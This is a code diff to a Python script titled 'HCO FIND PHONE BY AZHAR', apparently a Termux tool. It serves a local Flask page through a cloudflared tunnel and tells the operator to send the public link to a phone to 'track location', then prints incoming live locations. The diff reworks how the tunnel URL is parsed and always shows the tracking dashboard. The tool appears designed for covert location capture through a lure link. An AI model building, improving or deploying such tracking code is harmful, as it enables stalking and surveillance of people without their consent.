@@ -88,40 +88,43 @@ def tool_lock_youtube():
         print(f"Open YouTube manually: {youtube_url}")
     input("\nPress ENTER after returning from YouTube...")
 
-# ---------------- Start cloudflared tunnel and capture URL -----------------
+# ---------------- Start cloudflared tunnel and capture URL automatically -----------------
 def start_cloudflared():
     global cloudflare_link
-    # Start cloudflared process
-    process = subprocess.Popen(["cloudflared","tunnel","--url","http://127.0.0.1:5000"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
     cloudflare_link = None
-    # Parse output for public URL
-    for line in process.stdout:
+    process = subprocess.Popen(["cloudflared","tunnel","--url","http://127.0.0.1:5000"],
+                               stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+    # Read output line by line until we find a valid public URL
+    while True:
+        line = process.stdout.readline()
+        if not line:
+            break
         if "https://" in line:
-            match = re.search(r"(https://[^\s]+)", line)
+            match = re.search(r"(https://[^\s]+\.trycloudflare\.com)", line)
             if match:
                 cloudflare_link = match.group(1)
                 break
+    # If URL still not found, fallback
     if not cloudflare_link:
-        cloudflare_link = input("Enter Cloudflare URL manually: ")
+        print("Could not detect Cloudflare URL automatically. Please paste it manually:")
+        cloudflare_link = input()
 
 # ---------------- Main -----------------
 if __name__=="__main__":
     # Start Flask server
     threading.Thread(target=start_server, daemon=True).start()
     # Start Cloudflare tunnel and capture public URL
-    threading.Thread(target=start_cloudflared, daemon=True).start()
-    time.sleep(5)  # Wait for Cloudflare to initialize
+    start_cloudflared()
     # Tool lock + countdown + YouTube
     tool_lock_youtube()
     # Dashboard display
-    if cloudflare_link:
-        os.system(CLEAR)
-        print(f"{RED}{'='*80}")
-        print(f"{RED}{'HCO FIND PHONE BY AZHAR'.center(80)}")
-        print(f"{RED}{'='*80}{RED}\n")
-        print(f"{GREEN}{'Send this link to the phone to track location:'.center(80)}{GREEN}\n")
-        print(f"{GREEN}{cloudflare_link.center(80)}{GREEN}\n")
-        print(f"{CYAN}{'Waiting for live location updates...'.center(80)}{CYAN}\n")
+    os.system(CLEAR)
+    print(f"{RED}{'='*80}")
+    print(f"{RED}{'HCO FIND PHONE BY AZHAR'.center(80)}")
+    print(f"{RED}{'='*80}{RED}\n")
+    print(f"{GREEN}{'Send this link to the phone to track location:'.center(80)}{GREEN}\n")
+    print(f"{GREEN}{cloudflare_link.center(80)}{GREEN}\n")
+    print(f"{CYAN}{'Waiting for live location updates...'.center(80)}{CYAN}\n")
     # Live location printing in Termux
     while True:
         if locations:
